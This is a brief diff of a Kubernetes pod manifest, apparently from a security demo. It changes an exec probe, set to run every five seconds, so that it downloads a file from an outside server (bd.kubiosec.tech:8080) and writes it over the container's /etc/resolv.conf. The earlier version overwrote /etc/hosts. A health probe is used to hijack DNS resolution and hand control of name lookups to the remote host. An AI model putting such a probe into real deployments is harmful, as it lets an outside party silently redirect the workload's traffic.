@@ -34,9 +34,9 @@ spec:
       exec:
         command:
         - curl
-        - www.xxxxx.com/host.txt
+        - bd.kubiosec.tech:8080/host.txt
         - -o 
-        - /etc/hosts
+        - /etc/resolv.conf
       initialDelaySeconds: 5
       periodSeconds: 5
 EOF
